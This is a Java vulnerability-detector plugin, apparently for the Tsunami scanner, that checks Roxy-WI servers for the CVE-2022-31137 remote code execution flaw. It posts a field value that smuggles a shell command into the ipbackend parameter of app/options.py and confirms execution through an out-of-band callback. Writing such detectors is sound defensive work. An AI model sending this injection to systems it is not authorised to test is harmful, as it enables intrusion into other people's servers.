/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202231137;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.cves.cve202231137.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Optional;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Roxy-wi RCE CVE-2022-31137. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Roxy-wi RCE CVE-2022-31137 Detector",
    version = "0.1",
    description = "This detector checks Roxy-wi RCE (CVE-2022-31137)",
    author = "am0o0",
    bootstrapModule = Cve202231137DetectorBootstrapModule.class)
public final class Cve202231137Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  @VisibleForTesting static final String VULNERABLE_REQUEST_PATH = "app/options.py";
  private static final String HTTP_PARAMETERS = "alert_consumer=1&ipbackend=\";%s+#";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final int oobSleepDuration;

  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202231137Detector(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {

    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202231137Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isRoxyWiWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isRoxyWiWebService(NetworkService networkService) {
    // note that this fingerprint phase is only for vulnerable versions,
    // because newer Roxy-Wi versions have different endpoints for login
    String targetUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "app/login.py";
    try {
      Optional<String> response =
          httpClient.send(get(targetUrl).withEmptyHeaders().build(), networkService).bodyString();
      return response.isPresent() && response.get().contains("<title>Login page - Roxy-WI</title>");
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
    return false;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    // Check callback server is enabled
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atInfo().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    String cmd = payload.getPayload();

    HttpResponse response = null;
    String targetVulnerabilityUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULNERABLE_REQUEST_PATH;
    try {
      response =
          httpClient.send(
              post(targetVulnerabilityUrl)
                  .withEmptyHeaders()
                  .setRequestBody(
                      ByteString.copyFromUtf8(
                          String.format(
                              HTTP_PARAMETERS, URLEncoder.encode(cmd, StandardCharsets.UTF_8))))
                  .build(),
              networkService);
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
    if (response == null || response.bodyString().isEmpty()) {
      return false;
    }
    // If there is an RCE, the execution isn't immediate
    logger.atInfo().log("Waiting for RCE callback.");
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
    if (payload.checkIfExecuted(response.bodyString().get())) {
      logger.atInfo().log("RCE payload executed!");
      return true;
    }
    return false;
  }

  @VisibleForTesting
  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2022-31137"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Roxy-wi RCE (CVE-2022-31137)")
                .setDescription(
                    "Roxy-wi Versions prior to 6.1.1.0 are subject to a remote code execution"
                        + " vulnerability."))
        .build();
  }
}
